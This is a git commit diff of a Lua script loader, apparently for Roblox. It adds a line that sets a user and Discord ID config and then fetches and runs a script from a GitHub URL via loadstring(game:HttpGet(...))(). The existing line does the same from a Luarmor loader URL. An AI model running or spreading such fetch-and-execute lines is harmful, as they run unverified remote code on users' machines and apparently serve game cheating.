f08053fa7a1d1988c76deb49e4490382e0ed41c7
grandmaesx0-cell <grandmaesx0@gmail.com>
2025-08-14 03:09:50 +0300

    Update scriptLoader.lua

--- scriptLoader.lua
+++ scriptLoader.lua
@@ -1,1 +1,2 @@
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/c916e5b90dc37c71ecf1ec00dfce3d5d.lua"))() -- marmot whale
+_G.Config = { UserID = "66dfaa57-fe47-472f-bc63-33a68cb581d8", discord_id = "919669669047185438" , Note = "Pc", } loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/gag"))()
